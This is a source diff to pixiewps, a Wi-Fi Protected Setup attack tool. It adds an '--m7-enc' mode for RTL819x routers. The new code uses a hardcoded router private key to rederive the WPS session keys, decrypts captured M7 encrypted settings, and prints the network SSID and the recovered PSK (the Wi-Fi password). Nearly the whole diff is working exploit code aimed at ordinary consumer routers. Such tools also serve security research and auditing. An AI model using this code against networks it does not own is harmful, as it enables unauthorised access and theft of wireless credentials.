@@ -29,15 +29,18 @@
 #include <getopt.h>
 #include <pthread.h>
 #include <limits.h>
+#include <stdarg.h> /* libtommath.c */
 
 #include <sys/types.h>
 #include <sys/time.h>
 
 #include "pixiewps.h"
+#include "config.h"
+#include "crypto/crypto_internal-modexp.c"
+#include "crypto/aes-cbc.c"
+#include "utils.h"
 #include "wps.h"
 #include "random_r.h"
-#include "config.h"
-#include "utils.h"
 #include "version.h"
 
 uint32_t ecos_rand_simplest(uint32_t *seed);
@@ -45,7 +48,7 @@ uint32_t ecos_rand_simple(uint32_t *seed);
 uint32_t ecos_rand_knuth(uint32_t *seed);
 uint_fast8_t crack(struct global *g, char *pin);
 
-static const char *option_string = "e:r:s:z:a:n:m:b:o:v:j:SflVh?";
+static const char *option_string = "e:r:s:z:a:n:m:b:o:v:j:7:SflVh?";
 static const struct option long_options[] = {
 	{ "pke",       required_argument, 0, 'e' },
 	{ "pkr",       required_argument, 0, 'r' },
@@ -66,6 +69,7 @@ static const struct option long_options[] = {
 	{ "mode",      required_argument, 0,  1  },
 	{ "start",     required_argument, 0,  2  },
 	{ "end",       required_argument, 0,  3  },
+	{ "m7-enc",    required_argument, 0, '7' },
 	{  0,          no_argument,       0, 'h' },
 	{  0,          0,                 0,  0  }
 };
@@ -394,6 +398,15 @@ memory_err:
 					break;
 				}
 				goto usage_err;
+			case '7':
+				wps->m7_encr = malloc(ENC_SETTINGS_LEN);
+				if (!wps->m7_encr)
+					goto memory_err;
+				if (hex_string_to_byte_array_max(optarg, wps->m7_encr, ENC_SETTINGS_LEN, &wps->m7_encr_len)) {
+					snprintf(wps->error, 256, "\n [!] Bad m7 encrypted settings -- %s\n\n", optarg);
+					goto usage_err;
+				}
+				break;
 			case '?':
 			default:
 				fprintf(stderr, "Run %s -h for help.\n", argv[0]);
@@ -425,6 +438,109 @@ usage_err:
 			free(wps);
 			return ARG_ERROR;
 		}
+	}
+
+	/* Mode 3 is enforced to make users aware this option is currently only available for RTL819x */
+	if (wps->m7_encr) {
+		if (!wps->pke || !wps->pkr || !wps->e_nonce || !wps->r_nonce || !wps->e_bssid || !is_mode_selected(RTL819x)) {
+			snprintf(wps->error, 256, "\n [!] Must specify --pke, --pkr, --e-nonce, --r-nonce, --bssid and --mode 3!\n\n");
+			goto usage_err;
+		}
+		if (memcmp(wps->pke, wps_rtl_pke, WPS_PKEY_LEN)) {
+			printf("\n Pixiewps %s\n", SHORT_VERSION);
+			printf("\n [-] Model not supported!\n\n");
+			return UNS_ERROR;
+		}
+		wps->e_key = malloc(WPS_PKEY_LEN);
+		if (!wps->e_key)
+			goto memory_err;
+		SET_RTL_PRIV_KEY(wps->e_key);
+
+		size_t pkey_len = WPS_PKEY_LEN;
+		uint8_t *buffer = malloc(WPS_PKEY_LEN);
+		if (!buffer)
+			goto memory_err;
+
+		wps->dhkey   = malloc(WPS_HASH_LEN);       if (!wps->dhkey)   goto memory_err;
+		wps->kdk     = malloc(WPS_HASH_LEN);       if (!wps->kdk)     goto memory_err;
+		wps->authkey = malloc(WPS_AUTHKEY_LEN);    if (!wps->authkey) goto memory_err;
+		wps->wrapkey = malloc(WPS_KEYWRAPKEY_LEN); if (!wps->wrapkey) goto memory_err;
+		wps->emsk    = malloc(WPS_EMSK_LEN);       if (!wps->emsk)    goto memory_err;
+
+		/* DHKey = SHA-256(g^(AB) mod p) = SHA-256(PKe^A mod p) = SHA-256(PKr^B mod p) */
+		crypto_mod_exp(wps->pkr, WPS_PKEY_LEN, wps->e_key, WPS_PKEY_LEN, dh_group5_prime, WPS_PKEY_LEN, buffer, &pkey_len);
+		sha256(buffer, WPS_PKEY_LEN, wps->dhkey);
+		free(wps->e_key);
+
+		memcpy(buffer, wps->e_nonce, WPS_NONCE_LEN);
+		memcpy(buffer + WPS_NONCE_LEN, wps->e_bssid, WPS_BSSID_LEN);
+		memcpy(buffer + WPS_NONCE_LEN + WPS_BSSID_LEN, wps->r_nonce, WPS_NONCE_LEN);
+
+		/* KDK = HMAC-SHA-256{DHKey}(Enrollee nonce || Enrollee MAC || Registrar nonce) */
+		hmac_sha256(wps->dhkey, WPS_HASH_LEN, buffer, WPS_NONCE_LEN * 2 + WPS_BSSID_LEN, wps->kdk);
+
+		/* Key derivation function */
+		kdf(wps->kdk, buffer);
+		memcpy(wps->authkey, buffer, WPS_AUTHKEY_LEN);
+		memcpy(wps->wrapkey, buffer + WPS_AUTHKEY_LEN, WPS_KEYWRAPKEY_LEN);
+		memcpy(wps->emsk, buffer + WPS_AUTHKEY_LEN + WPS_KEYWRAPKEY_LEN, WPS_EMSK_LEN);
+
+		/* Decrypt encrypted settings */
+		uint8_t *decrypted = decrypt_encr_settings(wps->wrapkey, wps->m7_encr, wps->m7_encr_len);
+		free(wps->m7_encr);
+		if (!decrypted) {
+			printf("\n Pixiewps %s\n", SHORT_VERSION);
+			printf("\n [x] Unexpected error while decrypting (--m7-enc)!\n\n");
+			return UNS_ERROR;
+		}
+
+		printf("\n Pixiewps %s\n", SHORT_VERSION);
+		if (wps->verbosity > 1) {
+			printf("\n [*] Mode:                  %u (%s)", RTL819x, p_mode_name[RTL819x]);
+		}
+		vtag_t *vtag;
+		if (wps->verbosity > 2) {
+			printf("\n [*] DHKey:                 "); byte_array_print(wps->dhkey, WPS_HASH_LEN);
+			printf("\n [*] KDK:                   "); byte_array_print(wps->kdk, WPS_HASH_LEN);
+			printf("\n [*] AuthKey:               "); byte_array_print(wps->authkey, WPS_AUTHKEY_LEN);
+			printf("\n [*] EMSK:                  "); byte_array_print(wps->emsk, WPS_EMSK_LEN);
+			printf("\n [*] KeyWrapKey:            "); byte_array_print(wps->wrapkey, WPS_KEYWRAPKEY_LEN);
+			if (vtag = find_vtag(decrypted, wps->m7_encr_len - 16, WPS_TAG_KEYWRAP_AUTH, WPS_TAG_KEYWRAP_AUTH_LEN)) {
+				memcpy(buffer, vtag->data, WPS_TAG_KEYWRAP_AUTH_LEN);
+				printf("\n [*] KeyWrap Authenticator: "); byte_array_print(buffer, WPS_TAG_KEYWRAP_AUTH_LEN);
+			}
+		}
+		if (vtag = find_vtag(decrypted, wps->m7_encr_len - 16, WPS_TAG_SSID, 0)) {
+			int tag_size = be16_to_h(vtag->len);
+			memcpy(buffer, vtag->data, tag_size);
+			buffer[tag_size] = '\0';
+			printf("\n [*] SSID:                  %s", buffer);
+		}
+		if (vtag = find_vtag(decrypted, wps->m7_encr_len - 16, WPS_TAG_NET_KEY, 0)) {
+			int tag_size = be16_to_h(vtag->len);
+			memcpy(buffer, vtag->data, tag_size);
+			buffer[tag_size] = '\0';
+			printf("\n [+] PSK:                   %s\n\n", buffer);
+		} else {
+			printf("\n [-] PSK not found!\n\n");
+		}
+
+		free(decrypted);
+		free(buffer);
+		free(wps->pke);
+		free(wps->pkr);
+		free(wps->e_nonce);
+		free(wps->r_nonce);
+		free(wps->e_bssid);
+		free(wps->dhkey);
+		free(wps->kdk);
+		free(wps->authkey);
+		free(wps->wrapkey);
+		free(wps->emsk);
+		free(wps->error);
+		free(wps);
+
+		return 0;
 	}
 
 	/* Not all required arguments have been supplied */
